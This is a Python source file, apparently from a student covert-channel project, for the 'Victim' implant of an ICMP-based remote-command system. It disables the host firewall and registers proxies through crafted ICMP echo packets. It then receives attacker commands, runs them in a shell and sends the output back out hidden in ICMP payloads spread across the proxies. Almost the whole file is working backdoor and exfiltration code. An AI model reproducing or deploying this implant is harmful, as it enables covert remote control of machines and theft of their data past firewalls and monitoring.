#from scapy.all import * 
from scapy.all import IP, ICMP, Raw, AsyncSniffer

import sys
import os
import argparse
import random 
import threading
import sys
import select  
import ipaddress 

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods   

file_path = "./attacksingleton.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import attacksingleton 

#---------------------
def send_lastpacket_toall_proxies(attack_function:dict, proxy_list:list[ipaddress.IPv4Address]):
    if not com.is_dictionary(attack_function) or not com.is_list(proxy_list): 
        raise Exception("send_lastpacket_toall_proxies: Argomenti non corretti")  
    print(f"Aggiorniamo i proxy. Questo è l'ultimo pacchetto")
    unavailable_proxy=[]
    for proxy in proxy_list: 
        data=(com.LAST_PACKET).encode() 
        attacksingleton.send_data(attack_function, data, proxy) 
        #if not attacksingleton.send_data(attack_function, data, proxy): 
        #    unavailable_proxy.append(proxy) 
    return unavailable_proxy

def choose_proxy(proxy_list:list[ipaddress.IPv4Address]): 
    if not com.is_list(proxy_list): 
        raise Exception("choose_proxy: Argomenti non corretti") 
    print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}") 
    if not com.is_list(proxy_list) or len(proxy_list)<=0:
        raise ValueError("choose_proxy: Argomenti non corretti") 
    return random.choice(proxy_list) 

def get_data_from_command(process_shell):
    count=0
    print(f"Did command failed? {process_shell.poll() is not None}") 
    data=[]
    there_is_smth_to_read=True
    while there_is_smth_to_read: 
        count+=1
        print(f"lettura dei dati... {count}")
        print("UUU")
        reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
        print("UUU")
        ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
        for fd in ret[0]:
            if fd == process_shell.stdout.fileno(): 
                output_line = process_shell.stdout.readline()
                if output_line:
                    stripped_data=output_line.strip()
                    print("stdout:",stripped_data)
                    data.append(stripped_data) 
                    if com.END_DATA.strip() in stripped_data:
                        print(f"No more lines to read")
                        there_is_smth_to_read = False
                        break
                else:
                    print(f"stdout EOF {output_line}") 
                    there_is_smth_to_read = False
            if fd == process_shell.stderr.fileno(): 
                error_line = process_shell.stderr.readline()
                if error_line:
                    stripped_data=error_line.strip()
                    data.append(stripped_data)
                    print("stderr:", stripped_data) 
                    there_is_smth_to_read = False  
                    break
                else:
                    print(f"stderr EOF {output_line}") 
                    there_is_smth_to_read = False  
                    break
        # Optional: check if process exited early
        #if process_shell.poll() is not None and there_is_smth_to_read:
            #print("Process exited but streams may still have data")
    print(f"Command finished with exit code {process_shell.poll()}")
    return data 

def _windows_get_data_from_command(process_shell):
    data = []
    while True:
        line = process_shell.stdout.readline()
        if not line:
            break
        data.append(line.strip())
    return data
    #stdout_data, stderr_data = process_shell.communicate()
    #return stdout_data.splitlines(), stderr_data.splitlines() 

def read_stream(stream, buffer, label=""):
    for line in iter(stream.readline, ''):
        if line:
            decoded = line.rstrip()
            #print(f"{label}: {decoded}")
            buffer.append(decoded)
    stream.close()

def general_get_data_from_command(command:list[str]):
    if not isinstance(command, list):
        raise Exception(f"Argomenti non validi: {type(command)}\t{command}") 
    process_shell=mymethods.get_shellProcess_command("".join(x for x in command))  
    if com.is_valid_shell(process_shell):
        print("Shell aperta con successo...") 
    else: raise Exception(f"Shell non valida {process_shell}") 
    stdout_lines = []
    stderr_lines = [] 
    stdout_thread = threading.Thread(target=read_stream, args=(process_shell.stdout, stdout_lines, "OUT"))
    stderr_thread = threading.Thread(target=read_stream, args=(process_shell.stderr, stderr_lines, "ERR"))

    stdout_thread.start()
    stderr_thread.start() 
    process_shell.wait()
    process_shell.terminate()
    stdout_thread.join()
    stderr_thread.join() 
    return stdout_lines, stderr_lines

def check_system_compatibility():
    supportedSystems=["linux","win32"] 
    if sys.platform not in supportedSystems:
        return False
    return True 

def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
    def callback(packet):
        nonlocal comando, connected_proxy, event_pktconn
        print(f"callback wait_for_command received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
                comando.append(packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,""))
                checksum=mymethods.calc_checksum((com.CONFIRM_COMMAND+comando[0]).encode())
                print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                if packet[ICMP].id==checksum: 
                    print(f"Ricevuto il comando {comando}")
                    com.set_threading_Event(event_pktconn)
                    return 
            if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
                print(f"Received packet from not recognized address {packet[IP].src}")
            if com.CONFIRM_COMMAND.encode() not in packet[Raw].load:
                print(f"Payload doesn't have com.CONFIRM_COMMAND: {packet[Raw].load}")
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and com.END_COMMUNICATION.encode() in packet[Raw].load:
                print(f"End of communication ")
                comando.append(packet[Raw].load.decode()) #packet[Raw].load.decode().replace(com.END_COMMUNICATION,"")
                com.set_threading_Event(event_pktconn)
                return
    return callback
    
def wait_attacker_command(attack_function:dict, ip_host:ipaddress.IPv4Address, command:list): 
        if not com.is_dictionary(attack_function) or not com.is_IPAddress(ip_host) or not com.is_list(command):
            raise Exception(f"wait_attacker_command: argomenti non validi")
        print(f"Waiting data witch attack function: {attack_function}") 
        if attacksingleton.wait_data(attack_function, ip_host, command): 
            print(f"Finished waiting data. Comando ricevuto: {command}") 
            if len(command)==1:
                command=command[0].replace(com.CONFIRM_COMMAND,"")
            elif len(command)>1:
                print(f"Errore multipli comandi: {command}")
                command=command[0]
            elif len(command)<1: 
                print(f"Errore nessun comando: {command}")
                command=com.END_COMMUNICATION
        else: print("Comando non ricevuto") 

def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
        print("\n\nAAA data_to_send: ",data_to_send) 
        if not com.is_dictionary(attack_function) or not com.is_list(connected_proxy) or not com.is_list(data_to_send): 
            raise Exception("send_data_to_proxies: Argomenti non corretti") 
        if not com.is_list(data_to_send) or len(data_to_send)<=0:
            raise ValueError(f"send_data_to_proxies: Lista nessun dato presente {data_to_send}") 
        chosen_proxy=choose_proxy(connected_proxy) 
        print(f"Il proxy scelto è {chosen_proxy}") 
        #print("I dati che verranno mandati a", chosen_proxy," sono: ",data_to_send) 
        data_has_being_sent=False
        sequenza=0

        data_for_proxies:list[list]=[[] for _ in connected_proxy]
        print(f"data_for_proxies: {data_for_proxies}")
        for index in range(len(data_to_send)): 
            data_for_proxies[index % len(connected_proxy)].append(str(index)+"&&"+data_to_send[index])
        print(f"data_for_proxies: {data_for_proxies}")
        for index in range(len(data_for_proxies)):
            data_for_proxies[index]="".join(
                data_for_proxies[index][j] if j==0 
                else "||"+data_for_proxies[index][j] 
                for j in range(len(data_for_proxies[index]))
            )
        print(f"data_for_proxies: {data_for_proxies}")
        
        for data in data_to_send:
            print("Sending data: ",data) 
            if com.END_DATA in data: 
                try: 
                    unavailable_proxy=send_lastpacket_toall_proxies(attack_function, connected_proxy)  
                    print(f"Proxy che non hanno ricevuto l'aggiornamento {unavailable_proxy}")
                    #for proxy in unavailable_proxy:
                    #    connected_proxy.remove(proxy)
                    print(f"Proxy che hanno ricevuto l'aggiornamento {connected_proxy}")
                except Exception as e:
                    raise Exception(f"send_data_to_proxies: {e}")
                break
            data=data if isinstance(data,bytes) else data.encode()  
            print(f"Sending to proxy: {data} with attack function {attack_function}")
            data_has_being_sent=attacksingleton.send_data(attack_function, data, chosen_proxy) 
            #print("data_has_being_sent: ",data_has_being_sent)
            continue
            #data_has_being_sent=com.send_packet(
            #     data
            #    ,chosen_proxy
            #    ,icmp_seq=sequenza
            #) 
            if not data_has_being_sent:
                print(f"{chosen_proxy} non ha ricevuto i dati") 
                connected_proxy.remove(chosen_proxy)
                for proxy in connected_proxy.copy():
                    print(f"proviamo il proxy {proxy}")
                    #if com.send_packet( data,proxy,icmp_seq=sequenza): 
                    if attacksingleton.send_data(next(iter(attack_function.items()))[0], data, chosen_proxy):
                        chosen_proxy=proxy 
                        print(f"scelto il nuovo proxy {chosen_proxy}")
                        break
                    connected_proxy.remove(proxy) 
                    print(f"rimosso il proxy {proxy}")
            else:
                print(f"{chosen_proxy} ha ricevuto i dati")
            sequenza+=1

def append_END_DATA_2_command(command:list[str]):
    if not com.is_list(command):
        raise Exception(f"Argomenti non validi: {type(command)}")
    if sys.platform == "win32":
        command.append(f" && echo '{com.END_DATA}'")
    elif sys.platform=="linux": 
        command.append(f"; echo '{com.END_DATA}'") 
    else: print("Sistema operativo non supportato.")
#------------------------------------- 

def done_waiting_timeout(sniffer, enough_proxy_timer:threading.Timer, event_enough_proxy:threading.Event, callback_reached_proxy_number):
    if not com.is_AsyncSniffer(sniffer) or not com.is_threading_Timer(enough_proxy_timer) or not com.is_threading_Event(event_enough_proxy): 
        raise Exception("done_waiting_timeout: Argomenti non corretti")   
    if not callback_reached_proxy_number(): 
        print("Not enough proxies have arrived") 
        msg="Continuare ad aspettare ulteriori proxy? (s/n)"
        if mymethods.ask_bool_choice(msg):
            print("Continuo ad aspettare...")
            enough_proxy_timer = threading.Timer(
                WAITING_TIME
                ,lambda: done_waiting_timeout(sniffer, enough_proxy_timer, event_enough_proxy, callback_reached_proxy_number)
            )
            enough_proxy_timer.start()
            return
        else:
            print("Smetto di aspettare...") 
    print("Enough proxies have arrived") 
    com.set_threading_Event(event_enough_proxy)

#----------------
def reached_proxy_number(lock_connected_proxy:threading.Lock, connected_proxy:list[ipaddress.IPv4Address], num_proxy:int): 
    if not com.is_list(connected_proxy) or not com.is_threading_lock(lock_connected_proxy) or not com.is_integer(num_proxy):
        raise(f"Argoemnti non corretti") 
    lock_connected_proxy.acquire()
    is_enough_proxy=len(connected_proxy) >= num_proxy
    lock_connected_proxy.release() 
    if is_enough_proxy: 
        print(f"Raggiunto il numero ({num_proxy}) di proxy necessari:\n\t{connected_proxy}")
        return True 
    print(f"Necessari ancora {num_proxy-len(connected_proxy)} proxy")
    return False

def add_proxy_to_connected_list(connected_proxy:list, ip_src:ipaddress.IPv4Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
    if not com.is_list(connected_proxy) or not com.is_IPAddress(ip_src) or not com.is_threading_Event(event_enough_proxy) or not com.is_threading_lock(lock_connected_proxy) or not com.is_integer(num_proxy):
        raise(f"Argoemnti non corretti") 
    lock_connected_proxy.acquire()
    if ip_src not in connected_proxy:
        connected_proxy.append(ip_src) 
    lock_connected_proxy.release() 
    print(f"{ip_src} aggiunto alla lista dei proxy connessi\n\t{connected_proxy}")
    msg="Numero minimo di proxy raggiunto. Se ne vogiono aspettare di più? [s/n]"
    if reached_proxy_number(lock_connected_proxy, connected_proxy, num_proxy): # and mymethods.ask_bool_choice(msg)
        com.set_threading_Event(event_enough_proxy) 

def is_proxy_already_connected(proxy:ipaddress.IPv4Address ,connected_proxy:list, lock_connected_proxy:threading.Lock):
    if not com.is_IPAddress(proxy) or not com.is_list(connected_proxy) or not com.is_threading_lock(lock_connected_proxy): 
        raise Exception("send_data_to_proxies: Argomenti non corretti") 
    lock_connected_proxy.acquire()
    is_already_connected= proxy in connected_proxy
    lock_connected_proxy.release() 
    return is_already_connected 

def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int, attack_function:dict): 
    def callback(packet):
        nonlocal attack_function, connected_proxy, ip_host, event_enough_proxy, lock_connected_proxy, num_proxy
        #print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            print(f"Ricevuto pacchetto da {packet[IP].src}...")
            ip_src=ipaddress.ip_address(packet[IP].src)
            if is_proxy_already_connected(ip_src, connected_proxy, lock_connected_proxy): 
                print(f"already connected with {ip_src}:\n\t{connected_proxy}")
                return
            confirm_text=(com.CONFIRM_PROXY+ip_host.compressed).encode()
            #checksum=mymethods.calc_checksum(confirm_text)   

            if confirm_text in packet[Raw].load : #and checksum==packet[ICMP].id
                #confirm_conn_to_proxy  
                int_version=(packet[ICMP].id>>8) ^ ord("i")
                int_code=(packet[ICMP].id & 0xFF) ^ ord("p") 
                attack_function.update(attacksingleton.AttackType().get_attack_function("ipv"+str(int_version)+"_"+str(int_code)))
                print(f"***Updated attack Function: {attack_function}")
                data=(com.CONFIRM_VICTIM+ip_host.compressed+ip_src.compressed).encode()
                if com.send_packet(data,ip_src): 
                    add_proxy_to_connected_list(
                        connected_proxy
                        ,ip_src
                        ,event_enough_proxy
                        ,lock_connected_proxy
                        ,num_proxy
                    ) 
                    print(f"Il pacchetto ha confermato la connessione per {ip_src}") 
                    return
                print(f"{ip_src} non ha risposto al messaggio di conferma. ") 
        print(f"Il pacchetto non ha confermato la connessione...")
    return callback

#---------------- 
def check_value_in_parser(args): 
    try:
        if not isinstance(args,argparse.Namespace):
            raise Exception("Argomento parser non è istanza di argparse.Namespace")  
        if not isinstance(args.num_proxy, int):
            raise ValueError("Il numero di proxy non è un intero") 
    except Exception as e: 
        raise Exception(f"check_value_in_parser: {e}") 
    return True 

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    #parser.add_argument("--ip_host",type=str, help="L'IP dell host dove ricevere i pacchetti ICMP")
    parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")    
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}")

#---------------- 
WAITING_TIME=20
class Victim: 
    def __init__(self):
        try: 
            mymethods.disable_firewall() 
            self.define_variables()     
            self.proxy_connection() 
        except Exception as e:
            print(f"__init__ proxy conn: {e}")
            mymethods.reenable_firewall()
            exit(1) 
        try: 
            self.wait_command_send_data()
        except Exception as e:
            print(f"__init__ proxy conn: {e}")
            mymethods.reenable_firewall()
            exit(1) 
        mymethods.reenable_firewall()
    
    def reset_variables(self):
        pass
    
    def define_variables(self): 
        while True:
            try:
                ip_address, errore=mymethods.find_local_IP()
                if ip_address is not None and ipaddress.ip_address(ip_address): 
                    self.ip_host=ipaddress.ip_address(ip_address) 
                    print("***IP host: ",type(self.ip_host),self.ip_host)
                    break
                else:
                    print(f"Errore nel trovare l'IP locale: {errore}")
                    msg="Inserire indirizzo IP dell'host:\n\t#" 
                    self.ip_host=ipaddress.ip_address(input(msg))  
                    #self.ip_host=ipaddress.ip_address("192.168.56.102") #TODO eliminare alla fine
                    print("***IP host: ",type(self.ip_host),self.ip_host)
                    break 
            except Exception as e:
                print(f"define_variables: {e}")
        if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
            raise ValueError("args non è istanza di argparse.Namespace") 
        dict_values={
            "num_proxy":args.num_proxy  
        }
        self.num_proxy=dict_values.get("num_proxy")
        print(f"***Numero di proxy necessari: {type(self.num_proxy)} {self.num_proxy}")
        self.attack_function={}
        print("***Funzione per l'attacco ancora non definita")
    
    def proxy_connection(self): 
            self.connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
            self.lock_connected_proxy=threading.Lock()  
            self.wait_conn_from_proxy() 
            print(f"Funzione di attacco ricevuta: {self.attack_function}")
            print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
            if len(self.connected_proxy) < self.num_proxy: 
                print(f"Non sono stati trovati abbastanza proxy ({self.connected_proxy})")
                msg="Utilizzare comunque quelli trovati? [si/no]"
                if len(self.connected_proxy)<=0 or not mymethods.ask_bool_choice(msg) :
                    print("Interruzione del programma...")  
                    exit(0)
                else:
                    print("Continuo con i proxy trovati...") 
            print("attack_function: ",self.attack_function) 
    
    def wait_conn_from_proxy(self): 
        try:
            #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed 
            #checksum=mymethods.calc_checksum(confirm_text.encode()) 
            self.event_enough_proxy=com.get_threading_Event() 
            interface=mymethods.default_iface()   
            print(f"AAAA\t++++{interface}")
            filter=attacksingleton.get_filter_connection_from_function(
                "wait_icmpEcho_dst" 
                ,ip_dst=self.ip_host
            )  
            print(f"AAAA\t++++{filter}")
        except Exception as e:
            print(f"wait_conn_from_proxy filter: {e}") 
            return 
        try:  
            args={
                "filter": filter
                #,"count":1 
                ,"prn":callback_wait_conn_from_proxy(
                    self.connected_proxy
                    ,self.ip_host
                    ,self.event_enough_proxy
                    ,self.lock_connected_proxy
                    ,self.num_proxy
                    ,self.attack_function
                )
                #,"store":True 
                ,"iface":interface
            } 
            print(f"AAAA\t++++{args}")
            callback_function_timer = lambda: done_waiting_timeout(
                self.sniffer
                ,self.enough_proxy_timer
                ,self.event_enough_proxy
                ,lambda: reached_proxy_number(
                    self.lock_connected_proxy
                    ,self.connected_proxy
                    ,self.num_proxy
                )
            )
            self.sniffer,self.enough_proxy_timer=com.sniff_packet_w_callbak(
                args,WAITING_TIME,callback_function_timer
            )
        except Exception as e:
            print(f"wait_conn_from_proxy sniffing data: {e}",file=sys.stderr)  
        try: 
            com.wait_threading_Event(self.event_enough_proxy)   
            com.stop_sinffer(self.sniffer) 
            com.stop_timer(self.enough_proxy_timer) 
        except Exception as e:
            print(f"wait_conn_from_proxy closing connection: {e}",file=sys.stderr) 
    
    def wait_command_send_data(self):
        try:
            print(f"In attesa che l'attaccante invvii il comando")
            self.command:list[str]=[] 
            wait_attacker_command(self.attack_function, self.ip_host, self.command) 
            if not check_system_compatibility(): 
                raise Exception(f"{sys.platform} non supportato...") 
            print("Sistema supportato...") 
            append_END_DATA_2_command(self.command)
            while self.command and com.END_COMMUNICATION not in self.command and self.command not in com.exit_cases:
                try:  
                    print(f"Esecuzione del comando {self.command}")
                    print(f"Esecuzione del comando {self.command[0].replace('\n','')}; echo {com.END_DATA}")
                    stdout_lines, stderr_lines=general_get_data_from_command(self.command)
                    print(f"Comando eseguito...")   
                    if stderr_lines:
                        print(f"stderr_lines got from execution: {stderr_lines}") 
                        data=stderr_lines 
                    elif stdout_lines: 
                        print(f"stdout_lines got from execution: {stdout_lines}") 
                        data=stdout_lines 
                    else: 
                        print(f"Caso non contemplato: {stdout_lines}\t{stderr_lines}") 
                    send_data_to_proxies(data, self.connected_proxy, self.attack_function) 
                    print("Waiting for another command from the attacker")  
                    self.command:list[str]=[]
                    wait_attacker_command(self.attack_function, self.ip_host, self.command)
                    #break
                except Exception as e:
                    print(f"wait_command_send_data: {e}")
            print("Fine del programma") 
        except Exception as e:
            print(f"Eccezione: {e}")
            exit(1)
    
    
    

    

if __name__ == "__main__": 
    Victim()   
    